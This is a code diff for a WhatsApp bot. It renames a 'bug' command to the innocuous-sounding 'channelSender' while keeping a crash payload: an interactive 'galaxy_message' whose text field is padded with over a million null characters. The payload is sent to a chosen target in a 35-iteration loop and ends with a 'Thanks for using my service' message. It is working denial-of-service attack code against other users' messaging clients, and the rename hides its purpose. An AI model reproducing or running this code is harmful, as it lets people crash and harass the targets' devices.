@@ -1,4 +1,4 @@
-import bug from '../commands/bug.js'
+import channelSender from '../commands/channelSender.js'
 
 import pkg from "bailey";
 const { proto } = pkg;
@@ -27,7 +27,7 @@ async function bugs(message, client, participant){
 
                                 name: 'galaxy_message'
                                 ,
-                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvancechannelSender\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                 
                                 version: 3
                             }
@@ -74,12 +74,12 @@ async function fuck(message, client){
 
         } else {
 
-            throw new Error('Specify the person to bug.');
+            throw new Error('Specify the person to channelSender.');
         }
 
         const num = '@' + participant.replace('@s.whatsapp.net', '');
 
-        // Execute the bug command
+        // Execute the channelSender command
 
         for (let i = 0; i < 35; i++) {
 
@@ -91,13 +91,13 @@ async function fuck(message, client){
 
         }
 
-        await bug(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 4);
+        await channelSender(message, client, "Succceded in sending channelSender to the target.\n\nThanks for using my service.", 4);
 
     } catch (error) {
 
-        console.error("An error occurred while trying to bug the target:", error);
+        console.error("An error occurred while trying to channelSender the target:", error);
 
-        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
+        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to channelSender the target: ${error.message}` });
     }
 }
 
